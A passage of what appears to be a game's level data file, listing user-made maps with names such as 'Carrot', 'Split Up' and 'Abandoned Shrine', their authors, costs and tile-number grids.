9,39,39,39,39,39,39,39,39,0,0,0,0,0,0,19,0,0,0,39,39,39,39,39,39,39,39,39,39,0,0,0,19,0,0,0,0,0,0,0,39,39,39,39,39,39,39,39,0,0,0,0,0,0,0,0,0,0,0,0,0,39,39,39,39,39,39,0,0,0,0,0,0,0,0,19,100,0,0,0,0,0,39,39,39,39,0,0,0,0,0,100,19,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Carrot",author="TF2 Pencil",id="#1663392494",direction="forward",cost=143,elevation=0,map=[0,0,2,2,0,0,0,0,127,127,127,127,127,127,127,0,0,0,0,0,0,0,16,16,0,0,0,0,0,127,127,127,127,127,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,0,56,56,56,0,0,0,0,0,0,0,0,0,16,16,16,16,16,16,16,56,56,56,56,56,0,0,0,0,0,0,0,0,16,16,16,16,16,16,16,56,56,56,56,56,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,56,56,56,56,56,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,56,56,56,56,56,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,56,56,56,56,56,0,0,0,0,0,0,0,36,36,0,0,36,0,36,0,56,56,56,56,56,0,36,0,36,36,0,0,100,36,0,0,36,0,36,0,56,56,56,56,56,0,36,0,36,100,0,0,0,0,0,0,0,0,0,0,0,56,56,56,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,56,56,56,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,56,56,56,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,56,56,56,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,56,56,56,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,56,56,56,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,56,56,56,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,56,16,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0]});
maps.push({name="Cherry",author="TF2 Pencil",id="#1663392560",direction="forward",cost=147,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,111,111,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,111,111,111,111,111,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,111,111,111,111,111,0,0,0,0,0,0,0,0,0,0,0,0,127,127,127,111,111,111,111,111,0,32,100,0,0,0,0,0,0,0,0,127,0,0,0,111,111,111,111,111,0,0,0,0,0,0,0,0,0,0,127,0,0,0,111,111,111,111,111,0,0,0,0,0,0,0,0,0,0,127,0,0,0,0,0,111,111,0,0,0,0,0,0,0,0,0,0,0,127,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,127,127,127,127,0,0,0,0,0,0,111,111,0,0,0,0,0,0,0,0,129,0,0,0,127,127,0,0,0,111,111,111,111,111,0,0,0,0,0,0,129,129,0,0,0,0,127,0,0,0,111,111,111,111,111,0,0,0,0,0,129,129,129,0,0,0,0,127,127,127,111,111,111,111,111,0,32,100,0,0,0,129,129,0,0,0,0,0,0,0,111,111,111,111,111,0,0,0,0,0,0,0,0,0,0,0,0,0,0,111,111,111,111,111,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,111,111,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0]});
maps.push({name="Banana",author="TF2 Pencil",id="#1663392586",direction="forward",cost=151,elevation=0,map=[0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,0,40,40,40,40,40,40,0,0,0,0,0,0,0,0,0,0,0,40,40,40,40,40,40,40,40,40,40,0,0,40,40,40,0,0,0,0,0,40,40,40,40,40,40,40,40,40,40,40,0,0,0,40,100,0,0,0,0,0,0,0,40,40,40,40,40,40,40,40,0,0,0,0,40,0,0,0,0,0,0,0,0,0,40,40,40,40,40,40,40,0,0,0,40,0,0,0,0,40,40,0,0,0,0,0,40,40,40,40,40,0,0,0,0,0,0,0,0,0,40,40,0,0,0,0,40,40,40,40,40,0,40,40,0,0,0,0,0,0,0,100,0,0,0,0,40,40,40,40,40,0,0,0,40,0,0,0,0,0,0,40,0,0,0,0,40,40,40,40,40,0,0,0,100,0,0,0,0,0,40,40,0,0,0,0,40,40,40,40,40,0,0,0,40,0,0,0,0,0,40,0,0,0,0,0,40,40,40,40,40,0,0,0,40,0,0,0,0,0,0,0,0,0,0,40,40,40,40,40,40,0,0,40,0,0,0,0,0,40,40,40,0,0,0,40,40,40,40,40,0,0,0,0,0,0,0,0,0,0,0,40,40,0,40,40,40,40,40,40,0,40,40,40,0,0,0,0,0,0,0,0,100,0,40,40,40,40,40,0,0,0,0,100,40,0,0,0,0,0,0,0,40,0,0,40,40,40,0,0,0,0,0,0,40,0,0,0,0,0,0,40,40,0,0,0,20,20,0,0,0,0,0,0,40,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Stupid 7",author="TF2 Pencil",id="#1663392657",direction="right",cost=343,elevation=0,map=[0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,0,0,0,0,0,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,0,0,0,0,0,15,15,1,15,15,1,76,15,1,76,15,1,76,76,1,0,0,0,0,0,15,15,1,15,15,1,15,76,1,76,15,1,76,76,1,0,0,0,0,0,15,15,1,76,76,1,76,15,1,15,76,1,15,15,1,0,0,0,0,0,15,15,1,15,15,1,15,76,1,15,76,1,76,76,1,0,0,0,0,0,15,15,1,15,15,1,76,15,1,76,15,1,76,76,1,0,0,0,0,0,15,15,1,76,76,1,15,76,1,76,15,1,15,15,1,0,0,0,0,0,15,15,1,15,15,1,76,15,1,15,76,1,76,76,1,0,0,0,0,0,15,15,1,15,15,1,15,76,1,15,76,1,76,76,1,0,0,0,0,0,15,15,1,76,76,1,76,15,1,76,15,1,15,15,1,0,0,0,0,0,15,15,1,15,15,1,15,76,1,76,15,1,76,76,1,0,0,0,0,0,15,15,1,15,15,1,15,15,1,15,15,1,76,76,1,0,0,0,0,0,15,15,1,1,1,1,1,1,1,1,1,1,15,15,1,0,0,0,0,0,96,96,15,15,15,15,15,15,15,15,97,15,15,15,15,15,15,2,0,0,96,96,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="34f783vbydg8o398gube",author="TF2 Pencil",id="#1663392689",direction="forward",cost=456,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,14,34,34,34,34,34,34,34,34,34,34,34,34,34,34,14,0,0,0,0,14,34,54,54,54,54,54,54,54,54,54,54,54,54,34,14,0,0,0,0,14,34,54,114,114,114,114,114,114,114,114,114,114,54,34,14,0,0,0,0,14,34,54,114,144,144,144,144,144,144,144,144,114,54,34,14,0,0,0,0,14,34,54,114,144,144,144,144,144,144,144,144,114,54,34,14,0,0,0,0,14,34,54,114,144,144,144,144,144,144,144,144,114,54,34,14,0,0,0,0,14,34,54,114,144,144,144,144,144,144,144,144,114,54,34,14,0,0,0,0,14,34,54,114,144,144,144,144,144,144,144,144,114,54,34,14,0,0,0,0,14,34,54,114,144,144,144,144,144,144,144,144,114,54,34,14,0,0,0,0,14,34,54,114,144,144,144,144,144,144,144,144,114,54,34,14,0,0,0,0,14,34,54,114,144,144,144,144,144,144,144,144,114,54,34,14,0,0,0,0,14,34,54,114,114,114,114,114,114,114,114,114,114,54,34,14,0,0,0,0,14,34,54,54,54,54,54,54,54,54,54,54,54,54,34,14,0,0,0,0,14,34,34,34,34,34,34,34,34,34,34,34,34,34,34,14,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Split Up",author="sivi",id="#1663457240",direction="forward",cost=358,elevation=-2,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,14,14,1,1,1,1,1,1,1,1,1,1,90,21,21,90,21,21,14,125,93,48,5,65,65,65,90,5,5,90,1,1,21,21,21,21,21,21,14,125,94,48,5,65,65,65,5,5,5,5,1,1,21,21,21,21,21,21,14,125,93,48,5,65,65,65,5,5,5,5,1,1,90,21,21,1,1,1,1,1,1,1,1,1,1,1,1,5,5,90,1,1,21,21,21,1,1,1,1,1,1,1,1,1,1,1,1,5,5,5,1,1,21,21,21,121,0,0,0,97,1,1,99,0,0,0,105,5,5,5,1,1,90,21,21,121,0,0,0,23,1,1,7,0,0,0,105,5,5,90,1,1,121,121,121,1,0,0,0,0,1,1,0,0,0,0,1,105,105,105,1,1,98,98,98,1,22,0,0,22,1,1,6,0,0,6,1,96,96,96,1,1,121,121,121,1,1,1,1,1,1,1,1,1,1,1,1,105,105,105,1,1,90,21,21,12,65,65,65,12,88,88,12,5,125,5,5,5,5,90,1,1,21,21,21,12,65,65,65,12,12,12,12,5,125,5,5,5,5,5,1,1,21,21,90,12,65,65,65,12,12,12,12,5,125,5,5,90,5,5,1,1,1,1,1,1,1,1,1,90,12,12,90,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,1,12,12,12,12,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,12,12,12,12,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,90,2,2,90,1,0,0,0,0,0,0,0]});
maps.push({name="admin give us noclip",author="alli",id="#1663465695",direction="right",cost=179,elevation=0,map=[0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,19,94,93,19,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,19,19,19,19,19,19,0,0,0,0,0,0,0,0,14,14,0,0,0,0,19,19,100,19,19,19,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,19,19,127,19,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,14,14,0,0,0,0,0,29,9,9,29,9,29,0,120,44,14,14,14,14,14,14,0,0,0,0,0,9,131,131,9,65,9,0,120,44,125,14,14,14,14,14,0,0,0,0,0,9,131,131,9,65,9,0,120,44,14,14,14,14,14,14,0,0,0,0,0,29,9,9,29,9,29,0,0,1,1,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,40,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,29,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,42,0,44,44,44,0,14,14,0,0,0,0,0,0,0,0,0,9,0,0,0,0,44,97,44,0,14,14,0,0,0,0,0,0,126,0,0,3,0,0,43,0,44,93,44,0,14,14,14,14,96,96,14,14,14,14,14,14,2,0,0,0,44,94,44,0,14,65,14,14,96,96,14,14,14,14,14,14,2,0,0,0,44,44,44,0,14,14,14,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="guys dont go tp",author="alli",id="#1663465808",direction="left",cost=448,elevation=10,map=[0,0,0,0,0,0,135,135,135,135,135,135,0,0,0,0,0,14,2,2,0,0,0,0,135,135,135,135,135,135,135,135,135,135,0,0,0,128,14,14,0,0,135,135,135,135,135,135,135,135,135,135,135,135,135,0,0,128,14,14,0,135,135,135,135,14,14,14,14,14,14,135,135,135,135,135,0,0,0,0,0,135,135,135,14,14,14,14,141,14,14,14,14,135,135,135,135,0,0,0,135,135,135,14,14,14,24,24,24,24,24,14,14,14,135,135,135,0,0,0,135,135,14,14,13,24,24,23,24,24,24,24,13,14,14,135,135,0,0,0,135,135,14,14,14,24,24,24,23,24,24,24,14,13,14,135,135,0,0,0,135,135,14,14,24,24,23,24,24,24,23,24,24,14,14,135,135,0,44,44,135,135,14,141,24,23,24,24,131,24,24,24,24,141,14,135,135,0,128,44,135,135,14,14,24,24,24,23,24,23,24,23,24,14,14,135,135,0,44,93,135,135,14,14,14,24,24,24,24,24,24,24,24,14,14,135,135,0,44,94,135,135,135,14,13,14,24,24,24,23,24,13,14,14,135,135,135,0,0,0,0,135,135,14,14,13,14,24,24,24,24,14,14,135,135,135,135,0,43,0,0,135,135,135,14,14,14,14,141,14,14,14,135,135,135,135,0,0,41,0,0,0,135,135,135,14,14,14,14,14,135,135,135,135,135,0,0,0,39,0,1,1,1,135,135,135,135,135,135,135,135,135,135,135,0,1,0,0,37,0,2,24,24,1,135,135,135,135,135,135,135,135,0,0,0,0,1,1,35,0,2,24,24,132,1,0,135,135,135,135,0,0,0,0,0,0,143,31,33,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0]});
maps.push({name="Just A Bridge",author="sivi",id="#1663522497",direction="forward",cost=434,elevation=0,map=[0,0,0,0,10,10,10,10,10,2,2,10,10,10,10,10,0,0,0,0,0,0,0,0,10,90,5,5,90,5,5,90,5,5,90,10,0,0,0,0,0,0,0,0,10,5,5,5,5,5,5,5,5,5,5,10,0,0,0,0,0,0,0,0,10,90,5,5,139,5,5,139,5,5,90,10,0,0,0,0,0,0,0,0,10,75,75,75,13,46,46,13,75,75,75,10,0,0,0,0,0,0,0,0,10,75,75,75,90,47,47,90,75,75,75,10,0,0,0,0,0,0,0,0,10,75,75,75,15,48,48,15,75,75,75,10,0,0,0,0,0,0,0,0,10,75,75,75,90,49,49,90,75,75,75,10,0,0,0,0,0,94,5,133,10,75,75,75,17,50,50,17,75,75,75,10,131,5,93,0,0,93,5,76,79,76,75,75,10,50,50,10,75,75,76,79,76,5,94,0,0,94,5,133,10,75,75,75,17,50,50,17,75,75,75,10,131,5,93,0,0,0,0,0,10,75,75,75,90,49,49,90,75,75,75,10,0,0,0,0,0,0,0,0,10,75,75,75,15,48,48,15,75,75,75,10,0,0,0,0,0,0,0,0,10,75,75,75,90,47,47,90,75,75,75,10,0,0,0,0,0,0,0,0,10,75,75,75,13,46,46,13,75,75,75,10,0,0,0,0,0,0,0,0,10,90,5,5,134,5,5,132,5,5,90,10,0,0,0,0,0,0,0,0,10,88,5,5,5,5,5,5,5,5,88,10,0,0,0,0,0,0,0,0,10,88,5,5,5,5,5,5,5,5,88,10,0,0,0,0,0,0,0,0,10,90,5,5,90,5,5,90,5,5,90,10,0,0,0,0,0,0,0,0,10,139,10,10,10,2,2,10,10,10,139,10,0,0,0,0]});
maps.push({name="Deja Vu",author="sivi",id="#1663548479",direction="forward",cost=472,elevation=8,map=[1,1,1,1,1,1,1,1,1,1,1,1,1,5,2,2,5,1,1,1,1,1,1,132,132,132,132,1,1,1,1,5,5,5,5,5,5,94,97,1,1,5,5,5,5,5,5,94,99,1,1,6,6,90,5,5,5,90,13,1,1,6,6,90,5,5,5,90,13,1,1,7,7,5,65,65,65,5,5,1,1,7,7,5,65,65,65,5,5,1,1,8,8,90,65,65,65,90,5,1,1,8,8,90,65,65,65,90,5,1,1,9,9,5,65,65,65,5,13,1,1,9,9,5,65,65,65,5,13,1,1,10,10,90,65,65,65,90,5,1,1,10,10,90,65,65,65,90,5,1,1,11,11,5,5,5,5,5,5,1,1,11,11,5,5,5,5,5,5,1,1,12,12,5,5,5,5,92,92,1,1,12,12,5,5,5,5,92,92,1,1,13,13,33,33,33,33,13,13,1,1,13,13,33,33,33,33,13,13,1,1,13,13,33,33,33,33,13,90,1,1,13,13,33,33,33,33,13,90,1,1,5,5,5,5,5,5,13,13,1,1,5,5,5,5,5,5,13,13,1,1,5,5,5,5,5,5,13,13,1,1,5,5,5,5,5,5,13,13,1,1,3,90,5,93,5,90,13,90,1,1,3,90,5,93,5,90,13,90,1,1,13,13,13,13,13,139,13,13,1,1,13,13,13,13,13,139,13,13,1,1,13,90,13,13,13,13,90,13,1,1,13,90,13,13,13,13,90,13,1,1,1,1,1,96,96,1,1,1,1,1,1,1,1,98,98,1,1,1,1,1,1,1,1,113,113,1,1,1,1,1,0,0,1,113,113,1,0,0,0,0,0,0,1,131,131,1,0,0,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Abandoned Shrine",author="Gemzis",id="#1663607551",direction="forward",cost=394,elevation=1,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,50,50,50,50,50,50,50,50,50,50,50,50,50,10,10,50,50,0,0,50,51,51,51,51,51,51,51,51,51,51,51,51,51,51,51,51,51,0,0,50,51,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,51,50,0,50,51,85,52,52,52,52,52,52,52,52,52,52,52,52,52,85,51,50,0,50,51,85,52,88,53,88,126,88,126,88,126,88,53,88,52,85,51,50,0,50,51,85,52,53,54,54,54,54,54,54,54,54,54,53,52,85,51,50,0,50,51,85,52,53,128,87,55,55,55,55,55,87,129,53,52,85,51,50,0,50,51,85,52,53,54,55,56,56,56,56,56,55,54,53,52,85,51,50,0,50,51,85,52,53,128,55,56,57,97,57,56,55,129,53,52,85,51,50,0,50,51,85,52,88,54,55,56,57,100,57,56,55,54,88,52,85,51,50,0,50,51,85,52,53,128,55,56,56,56,56,56,55,129,53,52,85,51,50,0,50,51,85,52,53,54,87,55,55,55,55,55,87,54,53,52,85,51,50,0,50,51,85,52,53,128,54,54,54,54,54,54,54,129,53,52,85,51,50,0,50,51,85,52,88,53,144,144,144,144,144,144,144,53,88,52,85,51,50,0,50,51,85,52,52,52,52,52,52,52,52,52,52,52,52,52,85,51,50,0,50,51,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,51,50,0,50,51,51,51,51,51,51,51,51,51,51,51,51,51,51,51,51,51,50,0,0,50,50,50,96,96,96,96,50,50,50,50,50,50,50,50,50,50,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="CrouchHeaven",author="Hichatu",id="#1663608697",direction="forward",cost=98,elevation=0,map=[0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,24,24,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,142,142,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,24,24,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,143,143,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,24,24,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,142,142,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,24,24,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,143,143,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,24,24,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,142,142,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,24,24,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,143,143,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,24,24,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,142,142,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,24,24,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,143,143,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,24,24,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,143,143,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0]});
maps.push({name="risky sideway",author="yes me",id="#1663615457",direction="right",cost=262,elevation=-11,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,1,1,0,0,0,0,0,0,0,0,21,22,22,23,23,24,24,58,58,44,1,1,0,0,0,0,0,0,0,0,20,19,19,18,18,18,58,58,58,44,1,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,17,17,17,44,1,1,1,1,1,0,0,11,11,1,23,1,0,15,15,15,15,17,0,44,1,1,1,1,1,0,0,11,11,0,0,0,14,14,15,15,15,0,0,1,1,1,0,0,0,0,95,7,7,0,0,14,14,14,15,0,0,44,1,1,1,0,0,7,7,7,95,7,2,0,13,13,14,14,0,0,0,1,1,1,0,0,8,7,7,7,95,7,2,0,13,13,13,0,0,44,1,1,1,0,0,8,8,8,7,0,95,7,7,0,13,13,13,44,0,1,1,1,0,0,8,8,8,8,0,0,0,11,11,0,13,13,12,12,0,0,1,0,0,0,9,9,9,0,0,0,0,11,11,0,0,12,12,12,12,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,12,12,11,91,0,0,10,10,9,9,0,0,0,0,0,0,0,0,92,0,0,12,91,11,11,10,10,10,10,0,0,0,0,0,0,14,0,0,23,24,58,24,11,11,11,10,10,10,0,0,0,0,0,0,14,75,14,24,24,58,91,58,24,0,0,0,0,0,0,0,0,0,0,0,14,75,14,24,58,93,58,94,58,24,24,24,24,0,0,0,0,14,14,14,75,75,14,24,58,58,58,58,58,58,58,58,44,0,135,135,14,75,75,75,75,14,0,24,24,24,24,24,24,24,24,24,24,0,0,0,0,14,14,14,14,0,0]});
maps.push({name="Ladder Falls",author="ZpLit",id="#1663615667",direction="right",cost=192,elevation=0,map=[0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,67,0,0,67,0,0,0,3,85,86,3,0,0,0,0,0,0,0,0,3,1,0,3,1,5,88,67,1,5,5,1,67,0,0,0,0,87,5,5,86,5,5,85,5,5,2,0,0,5,5,0,0,0,0,0,0,5,5,5,85,5,5,86,5,5,2,0,0,5,5,0,0,0,0,0,0,5,5,0,3,1,0,3,1,5,88,0,3,86,85,3,0,0,0,0,0,5,5,0,0,67,0,0,67,0,0,67,1,5,5,1,67,0,0,67,1,5,5,1,67,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,3,85,86,3,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,3,85,86,3,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,67,1,5,5,1,67,0,0,67,1,5,5,1,67,0,0,0,0,0,0,0,0,5,5,0,0,0,67,0,3,86,85,3,0,0,0,0,0,0,0,0,0,5,5,0,0,3,1,0,0,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,85,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,87,5,5,5,86,5,5,5,5,87,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Unlock For More",author="TF2 Pencil",id="#1663616172",direction="forward",cost=209,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,10,10,0,0,0,0,0,0,0,0,0,0,0,1,10,10,10,10,10,89,10,10,0,30,30,0,35,36,37,0,0,0,0,1,93,10,93,10,10,89,10,10,0,30,30,0,34,0,38,0,0,0,0,1,10,93,10,93,10,89,10,10,1,0,0,0,0,0,0,0,0,0,0,1,94,10,94,10,10,89,10,10,1,30,30,0,0,0,0,0,0,0,0,1,10,94,10,94,10,89,10,10,1,0,0,0,34,0,38,0,0,0,0,1,10,10,10,10,10,89,10,10,1,30,30,0,34,0,38,0,0,0,0,1,1,1,1,1,1,1,10,10,1,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,10,10,1,30,30,0,0,0,0,0,0,0,0,1,10,10,10,10,10,98,10,10,1,30,97,0,34,0,38,0,0,0,0,1,10,93,93,93,10,98,10,10,1,0,0,0,34,0,38,0,0,0,0,1,10,93,93,93,10,1,96,96,1,0,0,0,0,0,0,0,0,0,0,1,10,93,93,93,10,1,10,10,1,30,0,0,0,0,0,0,0,0,0,1,10,93,93,93,10,1,10,10,1,30,0,0,34,0,38,0,0,0,0,1,10,10,10,10,10,1,10,10,1,31,32,33,34,0,99,0,0,0,0,1,1,1,1,1,1,1,10,10,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Defend Bottom",author="TF2 Pencil",id="#1663616345",direction="right",cost=232,elevation=8,map=[0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,97,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,125,14,14,0,0,0,0,0,0,0,14,14,18,18,18,18,18,18,18,18,18,14,14,0,22,22,22,0,0,0,14,14,18,18,18,18,18,18,18,18,18,14,14,0,22,132,22,0,0,0,14,14,18,125,22,22,22,22,22,18,18,14,14,0,22,22,22,0,0,0,14,14,18,18,22,96,96,96,22,18,18,14,14,0,22,22,0,0,0,0,14,14,18,18,22,96,131,96,22,18,18,14,14,0,22,22,0,0,0,0,14,14,18,18,22,96,96,96,22,18,18,14,14,0,22,22,0,0,0,0,14,14,18,18,22,22,22,22,22,125,18,14,14,0,22,22,0,0,0,0,14,14,18,18,18,18,18,18,18,18,18,14,14,0,22,22,0,0,0,0,14,14,18,18,18,18,18,18,18,18,18,14,14,0,22,22,0,0,0,0,14,14,125,14,14,14,14,14,14,14,14,14,14,0,22,22,22,2,0,0,97,14,14,14,14,14,14,14,14,14,14,14,97,0,22,22,22,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Ugly Pool",author="TF2 Pencil",id="#1663616533",direction="forward",cost=404,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,14,14,14,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,14,1,14,14,14,14,14,14,14,14,14,14,14,14,1,0,0,0,0,0,96,1,66,66,66,66,66,66,66,66,66,66,66,66,1,0,0,0,0,0,96,1,71,66,71,66,71,66,71,66,71,66,71,66,1,0,0,0,0,0,14,1,66,66,66,66,66,66,66,66,66,66,66,66,1,0,0,0,0,0,131,1,66,72,71,66,72,71,66,72,71,66,72,71,1,0,0,0,0,0,0,1,66,66,66,66,66,66,66,66,66,66,66,66,1,0,0,0,0,0,0,1,66,66,66,66,66,66,66,66,66,66,66,66,1,0,0,0,0,0,0,1,71,66,71,66,71,66,71,66,71,66,71,66,1,0,0,0,0,0,0,1,66,66,66,66,66,66,66,66,66,66,66,66,1,0,0,0,0,0,0,1,66,66,66,66,66,66,66,66,66,66,66,66,1,0,0,0,0,0,0,1,71,72,66,71,72,66,71,72,66,71,72,66,1,0,0,0,0,0,0,1,66,66,66,66,66,66,66,66,66,66,66,66,1,0,0,0,0,0,0,1,66,66,66,66,66,66,66,66,66,66,66,66,1,0,0,0,0,0,0,1,14,14,14,14,14,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,14,14,0,0,0,14,97,0,0,0,14,132,1,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
